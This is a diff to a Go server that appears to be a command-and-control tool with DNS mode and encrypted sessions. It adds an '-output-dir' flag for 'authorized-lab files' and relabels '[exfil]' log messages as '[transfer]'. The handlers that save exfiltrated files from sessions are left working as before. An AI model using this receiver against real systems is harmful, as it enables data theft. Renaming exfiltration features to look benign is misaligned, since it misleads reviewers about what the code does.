@@ -147,13 +147,15 @@ func main() {
 	ecdhe := flag.Bool("ecdhe", false, "automatic ECDH key exchange")
 	domain := flag.String("domain", "", "authoritative domain for DNS (enables auth DNS mode)")
 	apiAddr := flag.String("api", "", "REST API listen address (e.g. 127.0.0.1:8888)")
-	exfilDir := flag.String("exfil-dir", "./exfiltrated", "directory to save exfiltrated files")
+	outputDir := flag.String("output-dir", "", "directory for received authorized-lab files")
+	exfilDir := flag.String("exfil-dir", "./exfiltrated", "deprecated alias for -output-dir")
 	showVersion := flag.Bool("version", false, "print version and exit")
 	flag.Parse()
 	if *showVersion {
 		fmt.Println(buildinfo.String())
 		return
 	}
+	*exfilDir = resolveOutputDir(*exfilDir, *outputDir)
 
 	if *exfilDir != "" {
 		if err := os.MkdirAll(*exfilDir, 0700); err != nil {
@@ -461,11 +463,18 @@ func writePrivateFile(path string, data []byte) error {
 	return safefile.WriteFile(path, data)
 }
 
+func resolveOutputDir(legacy, current string) string {
+	if current != "" {
+		return current
+	}
+	return legacy
+}
+
 func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
 	payload := string(msg.Payload)
 	parts := strings.SplitN(payload, "\x00", 3)
 	if len(parts) < 3 {
-		fmt.Printf("[exfil] malformed exfil message\n")
+		fmt.Printf("[transfer] malformed file message\n")
 		return
 	}
 	filename := sanitizeFileName(parts[0])
@@ -476,7 +485,7 @@ func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
 
 	destPath := filepath.Join(exfilDir, fmt.Sprintf("%s_%d", filename, s.ID))
 	if err := writePrivateFile(destPath, data); err != nil {
-		fmt.Printf("[exfil] save error: %v\n", err)
+		fmt.Printf("[transfer] save error: %v\n", err)
 		return
 	}
 
@@ -485,7 +494,7 @@ func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
 	resp := protocol.Message{Type: protocol.MsgExfilAck, Payload: []byte(ack)}
 	sessionSendMsg(s, resp)
 
-	fmt.Printf("[exfil] received %s (%d bytes) -> %s [sha256:%x]\n", filename, size, destPath, fileHash[:8])
+	fmt.Printf("[transfer] received %s (%d bytes) -> %s [sha256:%x]\n", filename, size, destPath, fileHash[:8])
 }
 
 func handleExfilGlob(msg protocol.Message, exfilDir string, s *ManagedSession) {
